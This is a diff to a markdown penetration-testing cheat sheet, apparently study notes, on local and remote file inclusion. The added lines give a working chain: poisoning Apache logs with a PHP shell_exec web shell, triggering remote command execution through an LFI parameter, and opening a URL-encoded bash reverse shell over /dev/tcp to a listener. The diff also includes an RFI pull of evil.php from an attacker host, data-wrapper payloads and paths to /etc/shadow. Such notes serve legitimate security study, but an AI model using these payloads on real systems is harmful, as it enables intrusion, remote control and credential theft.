@@ -1760,18 +1760,22 @@ Directory traversal vulnerabilities allow an attacker to read local secret files
 
 File inclusion vulnerabilities allow an attacker to include a file into the application’s running code. To identify these vulnerabilities, you can search for file extensions in URL query strings and common vulnerable parameters like `file`, `path` and `folder` (see [scripts/fg.rb](scripts/fg.rb)).
 
-- **Local File Inclusion (LFI)**: execute a local file
-  1. Contaminate Apache logs by sending this payload `<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`. This payload will be saved in the logs
-  2. Perform a LFI with `http://<IP>/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`. It will load the contaminated logs and perform an RCE thanks to `shell_exec($_GET['cmd'])`
-- **Remote File Inclusion (RFI)**: execute a remote file
-  - An example: `http://<IP>/menu.php?file=http://<IP>/evil.php`
+**Local File Inclusion (LFI)**: execute a local file. An example: Apache's access.log contamination
+1. Once found a LFI, read the Apache's access.log `http://victim.com/page.php?file=<PAYLOAD>`
+   - Use `C:\xampp\apache\logs\access.log` or `../../../../../../../../../var/log/apache2/access.log`
+2. Notice which values from requests are saved. Contaminate Apache logs by sending this payload `<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`
+3. Execute a RCE with `http://victim.com/page.php?file=<apache/access.log>&cmd=ipconfig`. It will load the contaminated logs and perform an RCE thanks to `shell_exec($_GET['cmd'])`
+4. Run a reverse shell using a listener `nc -nvlp 4444` and in `&cmd` use `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22`
+
+**Remote File Inclusion (RFI)**: execute a remote file
+- An example: `http://<VICTIM>/menu.php?file=http://<ATTACKER>/evil.php`
 
 **PHP Wrappers**
 - `?file=data:text/plain,hello world`
 - `?file=data:text/plain,<?php echo shell_exec("dir") ?>`
 
 **To search**
-- `var/log/apache2/access.log`
+- `/var/log/apache2/access.log`
 - `/etc/passwd`
 - `/etc/shadow`
 
